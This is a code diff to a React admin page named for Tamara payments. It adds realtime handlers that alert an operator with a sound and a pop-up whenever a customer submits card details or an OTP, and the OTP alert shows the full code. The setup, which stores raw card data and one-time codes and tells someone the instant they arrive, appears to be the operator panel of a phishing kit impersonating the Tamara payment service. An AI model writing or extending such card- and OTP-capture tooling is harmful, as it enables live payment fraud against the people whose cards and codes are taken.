@@ -156,7 +156,14 @@ const AdminTamaraPayments = () => {
             schema: 'public',
             table: 'tamara_payment_attempts'
           },
-          () => {
+          (payload) => {
+            console.log('🔔 عميل أدخل بيانات بطاقة في تمارة!', payload.new);
+            playTamaraNotificationSound();
+            toast({
+              title: "🔔 بطاقة دفع جديدة في تمارة!",
+              description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
+              duration: 8000,
+            });
             fetchPayments();
           }
         )
@@ -167,7 +174,14 @@ const AdminTamaraPayments = () => {
             schema: 'public',
             table: 'tamara_otp_attempts'
           },
-          () => {
+          (payload) => {
+            console.log('🔔 عميل أدخل OTP في تمارة!', payload.new);
+            playTamaraNotificationSound();
+            toast({
+              title: "🔔 كود تحقق جديد في تمارة!",
+              description: `الكود: ${payload.new.otp_code}`,
+              duration: 8000,
+            });
             fetchPayments();
           }
         )
